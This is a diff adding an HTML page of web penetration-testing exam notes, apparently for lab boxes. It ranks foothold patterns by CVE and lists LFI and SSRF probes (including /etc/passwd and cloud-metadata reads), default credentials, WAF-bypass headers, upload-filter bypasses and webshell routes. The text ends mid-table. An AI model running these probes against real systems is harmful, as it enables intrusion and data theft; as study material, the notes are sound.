@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Web Methodology — Corey Clay</title>
+<meta name="description" content="The exam-day flow for web-first targets — fingerprint, enumerate, and match against frequency-ranked foothold patterns. Roughly 80% of the lab corpus ">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --ink:#14161b;--ink-2:#181b21;--panel:#1c2027;--panel-2:#20242c;
+    --line:#2c313b;--line-soft:#242932;
+    --fg:#e6e2d8;--fg-dim:#b7b6ae;--muted:#868c98;--muted-2:#5f6672;
+    --signal:#e8a33d;--signal-soft:rgba(232,163,61,.14);--signal-line:rgba(232,163,61,.34);
+    --green:#7fae7a;--red:#d17a6e;--blue:#7fa6c9;
+    --f-display:"Space Grotesk",system-ui,sans-serif;
+    --f-body:"Newsreader",Georgia,serif;
+    --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+    box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *,*::before,*::after{box-sizing:border-box}
+  html{scroll-behavior:smooth;scroll-padding-top:calc(126px + env(safe-area-inset-top,0px))}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--ink);color:var(--fg);font-family:var(--f-body);font-size:17px;line-height:1.6;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+    background-image:
+      radial-gradient(1100px 520px at 82% -8%, rgba(232,163,61,.05), transparent 60%),
+      linear-gradient(var(--line-soft) 1px, transparent 1px),
+      linear-gradient(90deg, var(--line-soft) 1px, transparent 1px);
+    background-size:auto,64px 64px,64px 64px;background-position:0 0,-1px -1px,-1px -1px;}
+  .grid-fade{position:fixed;inset:0;pointer-events:none;z-index:0;background:linear-gradient(180deg,transparent 0%,var(--ink) 42%)}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--signal-soft);color:var(--fg)}
+  .wrap{max-width:900px;margin:0 auto;padding:0 24px;position:relative;z-index:1}
+
+  header.site{position:sticky;top:0;z-index:50;background:rgba(20,22,27,.86);backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--line-soft);padding-top:env(safe-area-inset-top,0px)}
+  .bar{display:flex;align-items:center;justify-content:space-between;height:64px;max-width:900px;margin:0 auto;padding:0 24px}
+  .brand{display:flex;align-items:center;gap:11px;font-family:var(--f-mono);font-size:14px;letter-spacing:.02em}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--signal);box-shadow:0 0 0 3px var(--signal-soft);flex:none}
+  .brand b{color:var(--fg);font-weight:700}
+  .brand span{color:var(--muted)}
+  nav.top{display:flex;gap:24px;font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  nav.top a{transition:color .18s ease}
+  nav.top a:hover,nav.top a.here{color:var(--signal)}
+  nav.top a:focus-visible,.brand:focus-visible{outline:2px solid var(--signal);outline-offset:4px;border-radius:2px}
+  @media (max-width:680px){nav.top a:not(.here):not(.home){display:none}}
+
+  .cs-hero{padding:56px 0 22px}
+  .cs-hero .kicker{font-family:var(--f-mono);font-size:12.5px;color:var(--signal);margin:0 0 10px}
+  .cs-hero .kicker a{color:var(--muted)}
+  .cs-hero .kicker a:hover{color:var(--signal)}
+  .cs-hero h1{font-family:var(--f-display);font-weight:600;font-size:clamp(30px,5vw,46px);letter-spacing:-.02em;
+    line-height:1.05;margin:0 0 14px;color:var(--fg)}
+  .cs-hero p{max-width:64ch;color:var(--fg-dim);font-size:18px;margin:0}
+
+  .sec-nav{position:sticky;top:64px;z-index:40;background:rgba(20,22,27,.92);backdrop-filter:blur(8px);
+    border-bottom:1px solid var(--line-soft);padding:11px 0}
+  .sec-nav .inner{display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;max-width:900px;margin:0 auto;padding:0 24px}
+  .sec-nav .inner::-webkit-scrollbar{display:none}
+  .sec-nav a{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);white-space:nowrap;
+    padding:5px 11px;border:1px solid var(--line);border-radius:20px;transition:.16s;flex:none}
+  .sec-nav a:hover,.sec-nav a:focus-visible{color:var(--signal);border-color:var(--signal-line)}
+  .sec-nav a.here{color:var(--signal);border-color:var(--signal-line);background:var(--signal-soft)}
+  .sec-nav a:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+
+  main{padding:12px 0 40px}
+  main h2{font-family:var(--f-display);font-weight:600;font-size:clamp(23px,3.2vw,30px);letter-spacing:-.01em;
+    color:var(--fg);margin:56px 0 8px;padding-top:20px;border-top:1px solid var(--line-soft);scroll-margin-top:130px}
+  main h2:first-of-type{border-top:0;margin-top:20px}
+  main h3{font-family:var(--f-display);font-weight:500;font-size:19px;color:var(--fg);margin:30px 0 10px}
+  main h4{font-family:var(--f-mono);font-size:14px;color:var(--signal);margin:22px 0 8px;letter-spacing:.01em}
+  main p{color:var(--fg-dim);margin:0 0 16px;max-width:74ch}
+  main strong{color:var(--fg);font-weight:600}
+  main a{color:var(--signal)}
+  main a:hover{text-decoration:underline}
+  main ul,main ol{color:var(--fg-dim);margin:0 0 18px;padding-left:22px;max-width:74ch}
+  main li{margin-bottom:6px}
+  main ul li::marker{color:var(--signal)}
+  main hr{border:0;border-top:1px solid var(--line-soft);margin:8px 0}
+
+  .code-wrap{position:relative;margin:0 0 18px}
+  main pre{background:var(--ink-2);border:1px solid var(--line);border-radius:8px;overflow-x:auto;
+    margin:0;padding:15px 17px;font-family:var(--f-mono);font-size:13px;line-height:1.7;color:var(--fg-dim)}
+  main pre code{font-family:var(--f-mono);background:none;padding:0;color:inherit;white-space:pre}
+  main :not(pre) > code{font-family:var(--f-mono);font-size:.86em;background:var(--panel-2);
+    border:1px solid var(--line-soft);border-radius:5px;padding:1px 6px;color:var(--signal)}
+  .copy{position:absolute;top:8px;right:8px;font-family:var(--f-mono);font-size:11px;color:var(--muted);
+    background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:4px 10px;cursor:pointer;transition:.15s;opacity:.85}
+  .copy:hover,.copy:focus-visible{color:var(--signal);border-color:var(--signal-line);opacity:1}
+  .copy:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+  .copy.done{color:var(--green);border-color:rgba(127,174,122,.4)}
+
+  .table-scroll{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line-soft);border-radius:8px}
+  main table{border-collapse:collapse;width:100%;font-size:14px;min-width:520px}
+  main th{font-family:var(--f-mono);font-size:12px;text-align:left;color:var(--signal);
+    background:var(--panel-2);padding:10px 14px;border-bottom:1px solid var(--line);font-weight:500;white-space:nowrap}
+  main td{padding:10px 14px;border-bottom:1px solid var(--line-soft);color:var(--fg-dim);vertical-align:top}
+  main tr:last-child td{border-bottom:0}
+  main td code{white-space:nowrap}
+
+  footer.site{border-top:1px solid var(--line-soft);padding:44px 0 60px;margin-top:40px}
+  .foot{display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;align-items:center}
+  .foot .f-brand{font-family:var(--f-mono);font-size:13px;color:var(--muted)}
+  .foot .f-brand b{color:var(--fg)}
+  .foot-links{display:flex;gap:22px;font-family:var(--f-mono);font-size:13px}
+  .foot-links a{color:var(--muted);transition:color .16s}
+  .foot-links a:hover,.foot-links a:focus-visible{color:var(--signal)}
+  .disclaimer{font-family:var(--f-mono);font-size:11.5px;color:var(--muted-2);margin:30px 0 0;max-width:74ch;line-height:1.7;
+    border-left:2px solid var(--line);padding-left:16px}
+</style>
+</head>
+<body>
+<div class="grid-fade" aria-hidden="true"></div>
+
+<header class="site" id="top">
+  <div class="bar">
+    <a class="brand" href="index.html" aria-label="Home">
+      <span class="dot" aria-hidden="true"></span><b>corey.clay</b><span>/ web</span>
+    </a>
+    <nav class="top" aria-label="Primary">
+      <a class="home" href="index.html">home</a>
+      <a href="index.html#log">log</a>
+      <a class="here" href="methodology.html" aria-current="page">methodology</a>
+      <a class="" href="enumeration.html">enumeration</a>
+      <a href="https://www.linkedin.com/in/corey-clay-664943b8/" target="_blank" rel="noopener">linkedin</a>
+    </nav>
+  </div>
+</header>
+
+<div class="cs-hero wrap">
+  <p class="kicker"><a href="methodology.html">&larr; methodology</a> &nbsp;/&nbsp; web-first boxes</p>
+  <h1>Web methodology</h1>
+  <p>The exam-day flow for web-first targets — fingerprint, enumerate, and match against frequency-ranked foothold patterns. Roughly 80% of the lab corpus is web-first, so this is the one to drill.</p>
+</div>
+
+<nav class="sec-nav" aria-label="Jump to section">
+  <div class="inner">
+      <a href="#prime-rules">Prime Rules</a>
+      <a href="#the-distilled-methodology-repeatable-playbook">The Distilled Methodology (Repeatable Playbook)</a>
+      <a href="#foothold-patterns-ranked-by-frequency-across-htb-pg-corpus">Foothold Patterns (Ranked by Frequency Across HTB + PG Corpus)</a>
+      <a href="#decision-tree-i-see-x-try-y">Decision Tree — &quot;I See X, Try Y&quot;</a>
+      <a href="#app-specific-one-shot-chains-memorise-high-frequency">App-Specific One-Shot Chains (Memorise — High Frequency)</a>
+      <a href="#egress-payload-survival">Egress + Payload Survival</a>
+      <a href="#after-foothold-first-30-seconds-linux">After Foothold — First 30 Seconds (Linux)</a>
+      <a href="#exam-day-web-checklist">EXAM-Day Web Checklist</a>
+  </div>
+</nav>
+<main class="wrap">
+<p>Exam-day flow for web-first boxes — <strong>~80% of the PG Practice + HTB corpus is web-first</strong>. If you drill one thing, drill this. Every step links to the full technique note.</p>
+<h2 id="prime-rules">Prime Rules</h2>
+<ol>
+<li><strong>Fingerprint the exact product + exact version, then CVE search.</strong> The version string is the whole game on ~80% of boxes.</li>
+<li><strong>Try default credentials before any CVE.</strong> <code>admin:admin</code>, <code>admin:password</code>, <code>&lt;appname&gt;:&lt;appname&gt;</code>, <code>root:root</code>.</li>
+<li><strong>When you have any file read, first look for creds</strong> — configs, DB files, <code>.git/</code>, embedded stores, <code>/proc/self/*</code>.</li>
+<li><strong>Every CVE-shaped chain has a manual EXAM-OK path.</strong> Never let a banned auto-tool block progress.</li>
+<li><strong>Add every discovered vhost to <code>/etc/hosts</code> immediately.</strong> WordPress/Rails/many modern apps 301 unknown paths to the canonical vhost URL — you'll waste hours dirbusting the wrong host name.</li>
+</ol>
+<hr />
+<h2 id="the-distilled-methodology-repeatable-playbook">The Distilled Methodology (Repeatable Playbook)</h2>
+<h3>Phase A — Broad Reconnaissance</h3>
+<p><strong>1. Full TCP scan first, then <code>-sC -sV</code> on open ports:</strong></p>
+<pre><code class="language-bash">sudo nmap -Pn -sC -sV -p- -v &lt;IP&gt; -oN scan.txt
+</code></pre>
+<p><strong>2. Note non-standard ports</strong> — PG boxes moved services deliberately as an intended-path signal:</p>
+<ul>
+<li>PostgreSQL 5437 (Nibbles)</li>
+<li>SSH 43022 (Hunit), SSH 7742 (Sorcerer)</li>
+<li>Openfire 9090/9091 (Fired)</li>
+<li>Mage AI 6789 (Zab)</li>
+<li>Werkzeug 5000/50000 (WallpaperHub, Hetemit)</li>
+<li>Gerapy 8000 (Levram)</li>
+<li>SmarterMail 9998 + 17001 (Algernon)</li>
+<li>Argus DVR 8080 (DVR4)</li>
+<li>Nexus 8081 (Billyboss)</li>
+</ul>
+<p>Non-defaults are almost always the intended path.</p>
+<p><strong>3. For every HTTP-shaped port:</strong></p>
+<pre><code class="language-bash">curl -sI http://&lt;IP&gt;:&lt;PORT&gt;/                        # headers — X-Powered-By, X-Version, Server
+whatweb http://&lt;IP&gt;:&lt;PORT&gt;/
+curl -s http://&lt;IP&gt;:&lt;PORT&gt;/ | grep -Ei 'version|generator|meta name'
+
+# Nmap http-enum — fires common admin path / directory-listing / CMS probes automatically.
+# Great &quot;first look&quot; before you commit to a gobuster wordlist.
+sudo nmap -p&lt;PORT&gt; --script=http-enum &lt;IP&gt;
+# Output pattern: /login.php: Possible admin folder, /db/: BlogWorx Database,
+#                 /uploads/: Potentially interesting directory w/ listing
+</code></pre>
+<p><strong>4. If a redirect fires</strong>, <code>Location:</code> header may reveal a vhost:</p>
+<pre><code class="language-bash">curl -sI http://&lt;IP&gt;/ | grep -i location    # -&gt; e.g. http://bitforge.lab/
+echo &quot;&lt;IP&gt; bitforge.lab plan.bitforge.lab&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<h3>Phase B — Per-App Fingerprinting (Before Dirbustering)</h3>
+<p><strong>Version tells that decide the CVE list:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Product</th>
+<th>Fingerprint</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Gitea</strong></td>
+<td><code>curl -sI http://&lt;IP&gt;:3000/api/v1/version</code> (JSON)</td>
+</tr>
+<tr>
+<td><strong>MantisBT</strong></td>
+<td><code>curl -s http://&lt;IP&gt;/bugtracker/api/rest/ -H "Authorization: Bearer x" -i \| grep -i X-Mantis-Version</code></td>
+</tr>
+<tr>
+<td><strong>Grafana</strong></td>
+<td><code>curl -s http://&lt;IP&gt;:3000/status</code></td>
+</tr>
+<tr>
+<td><strong>SmarterMail</strong></td>
+<td><code>curl -sk http://&lt;IP&gt;:9998/interface/root \| grep -i version</code></td>
+</tr>
+<tr>
+<td><strong>Openfire</strong></td>
+<td>Favicon MD5 <code>E4888EE8491B4EB75501996E41AF6460</code> (nmap mis-labels as Hadoop)</td>
+</tr>
+<tr>
+<td><strong>Mage AI</strong></td>
+<td>Favicon MD5 <code>14B7DB3EB16DEF7F593F14D8621E9BBB</code></td>
+</tr>
+<tr>
+<td><strong>Werkzeug httpd</strong> in nmap banner</td>
+<td>Flask app</td>
+</tr>
+<tr>
+<td><strong>Thin httpd</strong></td>
+<td>Ruby Rack (Clue: Cassandra Web)</td>
+</tr>
+<tr>
+<td><strong>Tornado httpd</strong></td>
+<td>Python (Mage AI)</td>
+</tr>
+<tr>
+<td><strong>Rails dev-mode error page</strong></td>
+<td>Leaks <code>Rails.root</code>, app name, session dumps (Hetemit, Medjed)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Login-page HTML title / footer:</strong> SOPlanning (BitForge), Openfire (Fired), Grav CMS admin (Astronaut), Confluence (Flu), TeamCity (Scrutiny), Zabbix, Nexus (Billyboss), Subrion CMS (Exfiltrated), Monstra (Monster).</p>
+<h3>Phase C — Vhost + Directory + Backup Enumeration</h3>
+<p><strong>Vhost fuzz (against a known-invalid Host header baseline first):</strong></p>
+<pre><code class="language-bash">curl -s -I http://&lt;IP&gt; -H &quot;HOST: defnotvalid.&lt;DOMAIN&gt;&quot; | grep &quot;Content-Length:&quot;
+ffuf -w &lt;WORDLIST&gt; -u http://&lt;IP&gt;/ -H &quot;Host:FUZZ.&lt;DOMAIN&gt;&quot; -fs &lt;INVALID_SIZE&gt;
+#   -H &quot;Host:FUZZ.&lt;DOMAIN&gt;&quot;    fuzz the Host header (vhost enum)
+#   -fs SIZE                    filter out responses of that content-length (baseline)
+</code></pre>
+<p><strong>Directory bruteforce with extensions and WP-catchall filter:</strong></p>
+<pre><code class="language-bash">gobuster dir -u http://&lt;VHOST&gt;/ \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
+  -x php,txt,html,bak,old \
+  -b 301,404 --exclude-length &lt;WP_CATCHALL_SIZE&gt; -t 30
+#   -x         file extensions to try
+#   -b         blacklist status codes
+#   --exclude-length   filter out fixed-size WP catch-all 301 responses
+#   -t         concurrent threads
+
+feroxbuster -u http://&lt;VHOST&gt;/ \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,html,txt,bak,old
+</code></pre>
+<p><strong>Always check these paths:</strong></p>
+<ul>
+<li><code>/.git/HEAD</code> — leaked repo</li>
+<li><code>/.env</code> — Laravel/Node config</li>
+<li><code>/robots.txt</code>, <code>/sitemap.xml</code> — surface enumeration</li>
+<li><code>/admin</code>, <code>/install</code>, <code>/setup</code>, <code>/wizard</code> — installer left in place</li>
+<li><code>/phpinfo.php</code>, <code>/backup</code></li>
+<li><code>/.git/logs/HEAD</code> — commit history</li>
+<li><code>/wp-content/uploads/</code>, <code>/uploads/</code></li>
+<li><code>/api/v1/version</code>, <code>/api/rest/</code></li>
+<li><code>/config</code>, <code>/console</code>, <code>/manager/html</code></li>
+</ul>
+<h3>Phase D — Attack Surface by App Class</h3>
+<p>Match what you see against the <strong>Frequency-ranked foothold patterns</strong> table below and pick the topmost fitting pattern.</p>
+<hr />
+<h2 id="foothold-patterns-ranked-by-frequency-across-htb-pg-corpus">Foothold Patterns (Ranked by Frequency Across HTB + PG Corpus)</h2>
+<table>
+<thead>
+<tr>
+<th>Rank</th>
+<th>Pattern</th>
+<th>Playbook area</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong>Known CMS/app CVE for exact version</strong> — Astronaut (Grav 1.10.7 CVE-2021-21425), Fired (Openfire 4.7.3 CVE-2023-32315), Flu (Confluence CVE-2022-26134), Fanatastic (Grafana CVE-2021-43798), Scrutiny (TeamCity CVE-2024-27198), BitForge (SOPlanning CVE-2024-27115), Levram (Gerapy CVE-2021-43857), Mantis (MantisBT CVE-2017-12419), nukem (WP simple-file-list CVE-2020-36847), Workaholic (wp-advanced-search CVE-2024-9796), Algernon (SmarterMail CVE-2019-7214), zenphoto (EDB 18083), Apex (OpenEMR CVE-2018-17179 / Responsive Filemanager CVE-2019-11393), Exfiltrated (Subrion CVE-2018-19422), BullyBox (BoxBilling CVE-2022-3552), Billyboss (Nexus CVE-2020-10199), Monster (Monstra CVE-2018-6383), Quackerjack (rConfig CVE-2020-10220 + 10879), Pebbles (ZoneMinder EDB 41239), DVR4 (Argus CVE-2018-15745), Fish (GlassFish CVE-2017-1000028)</td>
+<td>CMS exploitation, attacking common applications</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>LFI / path traversal -&gt; RCE or source disclosure</strong> — Snookums (LFI + <code>data://</code>), Fanatastic (<code>--path-as-is</code>), WallpaperHub (filename traversal write-&gt;read), XposedAPI (<code>?file=</code> behind X-Forwarded-For), Clue (Cassandra Web <code>%2f</code> encoded), SPX (SPX_UI_URI), Fish (<code>%c0%af</code> UTF-8 overlong), Zipper (php://filter + zip://), Mantis (rogue MySQL LOAD DATA)</td>
+<td>File inclusion</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>SQL injection -&gt; hash dump / INTO OUTFILE / RCE</strong> — Workaholic (<code>extractvalue()</code> error-based chunking), Pebbles (ZoneMinder stacked SQLi + INTO OUTFILE), Blaze (LIKE <code>%input%</code> + WAF sidesteps), Hawat, Quackerjack (rConfig SQLi)</td>
+<td>SQL injection</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>Default / weak / guessable credentials</strong> — Levram (Gerapy <code>admin:admin</code>), Nibbles (<code>postgres:postgres</code>), dora (eXtplorer <code>admin:admin</code>), Marketing (LimeSurvey <code>admin:password</code>), Exfiltrated (Subrion <code>admin:admin</code>), Apex (OpenEMR <code>admin:thedoctor</code>), SPX (Tiny File Manager <code>admin:admin@123</code> fallback), Roquefort (Gitea first-user-admin), Billyboss (Nexus <code>nexus:nexus</code> fallback), Medjed (BarracudaDrive setup-wizard), Hawat (Nextcloud <code>admin:admin</code>), Zab (Mage AI no auth)</td>
+<td>Password attacks</td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>Source / config disclosure via <code>.git/</code>, backups, <code>/proc/self/*</code></strong> — BitForge (<code>.git</code> git-dumper), BullyBox (<code>.git</code>), Scrutiny (git history via TeamCity VCS root), WallpaperHub (<code>/proc/self/cwd/</code>), Clue (<code>/proc/self/cmdline</code>), SPX (<code>phpinfo.php</code> leaks <code>SPX_KEY</code>)</td>
+<td>Web enumeration</td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>File upload -&gt; shell</strong> — Exfiltrated (Subrion <code>.phar</code> bypass), nukem (simple-file-list rename), MakeSense, Zipper (chained), BitForge (SOPlanning post-auth), SpiderSociety (FTP -&gt; webroot), dora (eXtplorer web UI), Access (<code>.htaccess</code> AddType), Craft (LibreOffice ODT macro), Hepet (MMG-LO ODS + swaks phish)</td>
+<td>File upload</td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong>Exposed / anonymous network service (not HTTP)</strong> — Bratarina (OpenSMTPD CVE-2020-7247), Wombo &amp; Sybaris (Redis unauth), Sorcerer (<code>/zipfiles/</code> HTTP + Tomcat), Clue (anon SMB + FreeSWITCH), various anon-FTP boxes</td>
+<td>Network service CVEs</td>
+</tr>
+<tr>
+<td>8</td>
+<td><strong>Credential brute force</strong> — Hunit (Hydra SSH — rare, only when other paths dead and username known)</td>
+<td>Password attacks</td>
+</tr>
+</tbody>
+</table>
+<h3>Recurring "Write -&gt; RCE" Bridges</h3>
+<p>Memorise these — every one converts a write primitive into code execution:</p>
+<ul>
+<li><strong>FTP/other write into Apache/nginx webroot</strong> -&gt; drop a <code>.php</code>/<code>.phar</code> webshell (SpiderSociety, dora, Workaholic)</li>
+<li><strong>SQL <code>INTO OUTFILE</code></strong> -&gt; webshell (Pebbles/ZoneMinder)</li>
+<li><strong>PostgreSQL <code>COPY ... FROM PROGRAM</code></strong> -&gt; direct RCE (Nibbles)</li>
+<li><strong>PHP wrappers</strong> — <code>data://text/plain;base64</code>, <code>zip://</code>, <code>php://filter</code> via LFI (Snookums, Zipper)</li>
+<li><strong>Redis</strong> — <code>MODULE LOAD</code> <code>.so</code> / <code>SLAVEOF</code> replication / <code>CONFIG SET</code> SSH key drop / cron write (Wombo, Sybaris)</li>
+<li><strong>Rogue MySQL server</strong> &lt;- target client with <code>LOAD DATA LOCAL INFILE</code> (Mantis)</li>
+<li><strong>Rogue LDAP / SMB</strong> — same primitive class (Responder poisoning is BANNED; only analyse-only <code>-A</code> allowed)</li>
+<li><strong>CMS "config field that shells out"</strong> — MantisBT <code>dot_tool</code>, WordPress theme editor, Monstra theme template, Gitea Git Hooks, Zabbix Scripts</li>
+</ul>
+<hr />
+<h2 id="decision-tree-i-see-x-try-y">Decision Tree — "I See X, Try Y"</h2>
+<table>
+<thead>
+<tr>
+<th>Observation</th>
+<th>Response</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Version banner in login page footer / <code>X-Version</code> header</td>
+<td>CVE search for <code>&lt;product&gt; &lt;exact-version&gt; exploit</code> before dirbustering</td>
+</tr>
+<tr>
+<td>Login page rejects <code>admin:admin</code></td>
+<td>Check app default creds (<code>nexus:nexus</code>, <code>admin:admin@123</code>, <code>admin:password</code>, <code>admin:thedoctor</code>)</td>
+</tr>
+<tr>
+<td><code>/install</code>, <code>/setup</code>, <code>/wizard</code>, <code>/admin/install.php</code> returns 200 post-install</td>
+<td>CMS installer left in place — MantisBT install.php rogue-MySQL, BarracudaDrive Config-Wizard, Subrion install, WP setup, Grav admin</td>
+</tr>
+<tr>
+<td>Login page rejects everything + open registration</td>
+<td>Check first-user-becomes-admin (Gitea, GLPI, MediaWiki, Bookstack)</td>
+</tr>
+<tr>
+<td><code>?file=</code> / <code>?page=</code> / <code>?img=</code> parameter</td>
+<td>LFI probes: <code>../../../etc/passwd</code>, <code>/proc/self/cwd/app.py</code>, <code>php://filter/convert.base64-encode/resource=index</code>, <code>data://text/plain;base64,&lt;b64&gt;</code></td>
+</tr>
+<tr>
+<td><code>curl</code> request 302/redirects to login for a valid-looking path</td>
+<td>Add <code>--path-as-is</code> (Fanatastic); or URL-encode <code>../</code> as <code>%2e%2e%2f</code>; or try overlong <code>%c0%af</code> (Fish)</td>
+</tr>
+<tr>
+<td><code>?url=</code> or <code>?redirect=</code> in a query string</td>
+<td>SSRF probes: <code>file:///etc/passwd</code>, <code>http://127.0.0.1:PORT/</code>, <code>http://169.254.169.254/</code> (cloud metadata)</td>
+</tr>
+<tr>
+<td>API endpoint returns <code>403 WAF: Access Denied</code> externally</td>
+<td>Header rotation: <code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Real-IP</code>, <code>X-Client-IP</code>, <code>Forwarded: for=127.0.0.1</code>, <code>Host: localhost</code> (XposedAPI)</td>
+</tr>
+<tr>
+<td>Verbose SQL error in response body</td>
+<td>Pivot from time-based blind to error-based <code>extractvalue()</code> / <code>updatexml()</code> (Workaholic)</td>
+</tr>
+<tr>
+<td>HTML entity encoding of <code>&lt;</code>/<code>&gt;</code> on the way to MySQL</td>
+<td>Use <code>BETWEEN</code> for range checks, or <code>extractvalue()</code> which needs no comparisons</td>
+</tr>
+<tr>
+<td>App error page reveals <code>Rails.root: /home/&lt;user&gt;/&lt;appname&gt;</code></td>
+<td>Real system user + <code>wp-config</code>/<code>.env</code>-equivalent in that dir</td>
+</tr>
+<tr>
+<td>Uploads dir returns 404 seconds after write</td>
+<td>Cron wipes the dir; chain exploit -&gt; shell in one script (nukem)</td>
+</tr>
+<tr>
+<td>Upload accepts <code>.php.png</code> / <code>.phar</code> / arbitrary content-type</td>
+<td>Craft double-extension or <code>.phar</code> bypass (Access <code>.htaccess</code> AddType, Exfiltrated <code>.phar</code>)</td>
+</tr>
+<tr>
+<td>Nginx WordPress catch-all 301 -&gt; canonical vhost</td>
+<td><code>/etc/hosts</code> and <code>--exclude-length</code> gobuster (Workaholic)</td>
+</tr>
+<tr>
+<td><code>/.git/HEAD</code> returns 200</td>
+<td><code>git-dumper</code> + <code>git log --all -p \| grep -iE '(password\|secret\|token)'</code> — deleted files are recoverable (BitForge, Scrutiny "Oops" commit)</td>
+</tr>
+<tr>
+<td>Verbose error page reveals <code>SECRET_KEY</code> or session key</td>
+<td>Session/CSRF forgery, deserialization attack (Rails DoubleTap CVE-2019-5420 — Medjed)</td>
+</tr>
+<tr>
+<td>Exposed maintenance banner ("system under maintenance") gated by IP</td>
+<td><code>chisel R:port:127.0.0.1:80</code> -&gt; maintenance sees loopback (Zab)</td>
+</tr>
+<tr>
+<td>CMS with "extensible" feature — plugin upload, theme editor, config-shell field, Git Hook</td>
+<td>Turn admin session into RCE via built-in feature, don't hunt for a CVE (Openfire plugin JAR, Mantis <code>dot_tool</code>, Gitea Git Hooks, Zabbix Scripts, WordPress theme editor, Monstra theme template)</td>
+</tr>
+<tr>
+<td>File upload lands but hardcoded extension filter blocks <code>.php</code></td>
+<td><code>.phtml</code>, <code>.phar</code>, <code>.php7</code>, <code>.pht</code>, or <code>.htaccess</code> + <code>AddType</code></td>
+</tr>
+<tr>
+<td>LFI + <code>include()</code> (proven via <code>php://filter</code>)</td>
+<td>RFI-capable -&gt; <code>data://text/plain;base64,...</code> for unauth RCE (Snookums)</td>
+</tr>
+<tr>
+<td>Small custom app with 2-3 endpoints</td>
+<td>Read the source of each; usually one has naive <code>eval()</code> or <code>exec()</code> (Hetemit <code>/verify</code>)</td>
+</tr>
+<tr>
+<td>Endpoint returns <code>405 Method Not Allowed</code> for one verb</td>
+<td>Try EVERY verb — GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD. <code>405</code> on one doesn't imply the others are blocked. Classic API-abuse chain: POST 405 -&gt; PUT succeeds and mutates state (mass-assignment / verb-tampering).</td>
+</tr>
+<tr>
+<td>Registration endpoint accepts arbitrary JSON fields</td>
+<td>Include a bonus admin key in the body (<code>"admin":"True"</code>, <code>"role":"administrator"</code>, <code>"is_staff":true</code>) — mass-assignment shipping the caller straight to admin</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="app-specific-one-shot-chains-memorise-high-frequency">App-Specific One-Shot Chains (Memorise — High Frequency)</h2>
+<table>
+<thead>
+<tr>
+<th>Product / version</th>
+<th>Chain</th>
+<th>Boxes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Grav CMS 1.10.7</strong></td>
+<td>EDB 49973 (CVE-2021-21425) unauth YAML write + Twig SSTI</td>
+<td>Astronaut</td>
+</tr>
+<tr>
+<td><strong>Openfire &lt;= 4.7.4 / 4.6.7</strong></td>
+<td>CVE-2023-32315 setup bypass -&gt; create admin -&gt; plugin JAR -&gt; <code>cmd.jsp</code></td>
+<td>Fired</td>
+</tr>
+<tr>
+<td><strong>Confluence 7.4 – 8.5.2</strong></td>
+<td>CVE-2022-26134 OGNL — one command</td>
+<td>Flu</td>
+</tr>
+<tr>
+<td><strong>Grafana 8.0.0-beta1 – 8.3.0</strong></td>
+<td>CVE-2021-43798 <code>curl --path-as-is</code> <code>/public/plugins/*/../</code> + <code>secret_key</code> (&lt; 9.x default)</td>
+<td>Fanatastic</td>
+</tr>
+<tr>
+<td><strong>TeamCity &lt; 2024.03</strong></td>
+<td>CVE-2024-27198 — enable <code>rest.debug.processes.enable=true</code></td>
+<td>Scrutiny</td>
+</tr>
+<tr>
+<td><strong>SOPlanning 1.52.01</strong></td>
+<td>CVE-2024-27115 — MySQL hash-swap admin</td>
+<td>BitForge</td>
+</tr>
+<tr>
+<td><strong>Gerapy 0.9.7</strong></td>
+<td>CVE-2021-43857 — <code>admin:admin</code> + backtick in <code>spider</code> param</td>
+<td>Levram</td>
+</tr>
+<tr>
+<td><strong>MantisBT 2.5.2</strong></td>
+<td>CVE-2017-12419 <code>install.php</code> rogue MySQL + <code>dot_tool</code> shell-out</td>
+<td>Mantis</td>
+</tr>
+<tr>
+<td><strong>WordPress simple-file-list &lt;= 4.2.2</strong></td>
+<td>CVE-2020-36847 EDB 48979 unauth</td>
+<td>nukem</td>
+</tr>
+<tr>
+<td><strong>WordPress wp-advanced-search 3.3.8</strong></td>
